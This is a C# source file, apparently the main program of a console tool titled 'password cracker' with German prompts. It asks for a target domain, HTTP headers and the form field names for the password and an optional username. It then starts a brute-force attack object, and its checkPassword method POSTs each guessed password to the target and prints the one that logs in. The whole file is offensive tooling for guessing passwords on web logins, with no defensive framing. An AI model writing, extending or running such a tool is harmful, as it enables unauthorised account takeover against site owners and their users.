using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using WebPasswordGether.Classes;


namespace WebPasswordGether
{
	class Program
	{
		public static bool va = false;

		static string domain;
		static string refrenz;
		static string Ctype;
		static string Accept;
		static string Key;
		static string passC;
		static string userC;


		static void Main(string[] args)
		{
			string t;
			Console.Title = "password cracker";
			Console.ForegroundColor = ConsoleColor.Red;
			Console.WriteLine("wenn du hilfe brauchst: "+"https://ezc404.github.io/passCrack");
			Console.ForegroundColor = ConsoleColor.White;
			Console.WriteLine("gebe die domain ein: ");
			domain = Console.ReadLine();
			Console.WriteLine("gebe die refrenz ein: ");
			refrenz = Console.ReadLine();
			Console.WriteLine("gebe den Content Type ein: ");
			Ctype = Console.ReadLine();
			Console.WriteLine("gebe die Accept message ein: ");
			Accept = Console.ReadLine();
			Console.WriteLine("gebe den Key ein: ");
			Key = Console.ReadLine();
			Console.WriteLine("gebe den name von dem password container ein: ");
			passC = Console.ReadLine();
			Console.WriteLine("benutzer wenn ja y wenn nein n:");
			t = Console.ReadLine();
			if(t == "y")
			{
				Console.WriteLine("gebe den name container ein: ");
				userC = Console.ReadLine();
				Console.WriteLine("geben den user name ein: ");
				userC = userC+"="+Console.ReadLine();
			}
			else
			{
				userC = "";
			}
			var guesser = new BruteForceattack();
		}

		public static void checkPassword(string pwd)
		{
			System.Net.CookieContainer myCookies = new System.Net.CookieContainer();
			string Postdata = passC+"="+pwd+userC;

			bool result = HttpMethods.Post(domain, Postdata, refrenz,myCookies,Ctype,Accept,Key);

			if (result)
			{
				Console.WriteLine("das password ist: " + pwd);
				BruteForceattack.v = true;
				Console.ReadKey();
				return;
			}
			else
			{
			}
		}
	}
}
